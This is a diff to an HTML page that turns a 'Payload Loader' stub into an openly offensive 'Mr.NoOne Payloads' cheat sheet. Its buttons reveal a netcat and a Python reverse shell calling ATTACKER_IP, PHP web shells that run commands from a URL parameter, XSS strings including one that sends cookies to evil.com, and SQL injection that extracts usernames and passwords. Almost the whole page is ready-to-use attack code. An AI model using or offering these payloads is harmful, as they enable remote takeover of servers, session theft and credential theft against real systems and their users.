@@ -3,9 +3,64 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Payload Loader</title>
+    <title>Mr.NoOne Payloads</title>
+    <style>
+        body {
+            background: #1a1a1a;
+            color: #00ff00;
+            font-family: monospace;
+            text-align: center;
+        }
+        .container {
+            max-width: 600px;
+            margin: 50px auto;
+            padding: 20px;
+            border: 2px solid #00ff00;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
+        }
+        .payload-btn {
+            display: block;
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            background: #333;
+            color: #00ff00;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .payload-box {
+            background: #000;
+            padding: 10px;
+            border-radius: 5px;
+            margin-top: 10px;
+            white-space: pre-wrap;
+        }
+    </style>
 </head>
 <body>
-    <script src="c4.js"></script>
+    <div class="container">
+        <h2>🚠 Mr.NoOne Payloads 🚠</h2>
+        <button class="payload-btn" onclick="showPayload('Netcat Reverse Shell')">Netcat Reverse Shell</button>
+        <button class="payload-btn" onclick="showPayload('PHP RCE')">PHP RCE</button>
+        <button class="payload-btn" onclick="showPayload('Python Reverse Shell')">Python Reverse Shell</button>
+        <button class="payload-btn" onclick="showPayload('XSS Payloads')">XSS Payloads</button>
+        <button class="payload-btn" onclick="showPayload('SQL Injection')">SQL Injection</button>
+        <div id="payload-container"></div>
+    </div>
+
+    <script>
+        function showPayload(type) {
+            let payloads = {
+                "Netcat Reverse Shell": "nc -e /bin/sh ATTACKER_IP PORT\nnc.exe -e cmd.exe ATTACKER_IP PORT",
+                "PHP RCE": "<?php system($_GET['cmd']); ?>\n<?php eval($_GET['cmd']); ?>",
+                "Python Reverse Shell": "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);",
+                "XSS Payloads": "\"><script>alert(1)</script>\n\"><script>document.location='http://evil.com/steal.php?c='+document.cookie</script>",
+                "SQL Injection": "' OR '1'='1' -- \n' UNION SELECT username,password FROM users -- "
+            };
+            document.getElementById("payload-container").innerHTML = "<div class='payload-box'>" + payloads[type] + "</div>";
+        }
+    </script>
 </body>
 </html>
